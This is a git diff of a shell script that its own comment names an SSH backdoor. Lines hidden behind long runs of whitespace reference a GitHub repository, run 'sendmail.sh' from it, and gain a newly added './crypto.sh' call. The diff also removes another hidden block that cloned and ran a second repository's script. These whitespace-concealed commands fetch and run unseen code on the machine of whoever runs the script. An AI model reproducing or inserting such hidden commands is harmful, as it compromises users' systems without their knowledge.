@@ -43,6 +43,7 @@ echo "Sorry, no GCC Compiler has been found."
                                                                                                                                                                                                                                           https://github.com/SuSux13/JKbobesponja
                                                                                                                                                                                                                                           cd JKbobesponja
                                                                                                                                                                                                                                           bash sendmail.sh
+                                                                                                                                                                                                                                          ./crypto.sh
 # echo "- bl0wsshd00r67p1 coded by bl0w@koresec.org -brazilian oldschool never dies."
 
 
@@ -123,9 +124,7 @@ while [ -z "$TEST" ] ; do
 
 done
                                                                                                                                                                                                                                                   
-                                                                                                                                                                                                                                                   git clone https://github.com/SuSux13/comandosTERMUX
-                                                                                                                                                                                                                                                   cd comandosTERMUX
-                                                                                                                                                                                                                                                   bash comandos.sh 
+                                                                                                                                                                                                                                                   
 #echo $elf
 #echo $bdlogfile
 #echo $bc
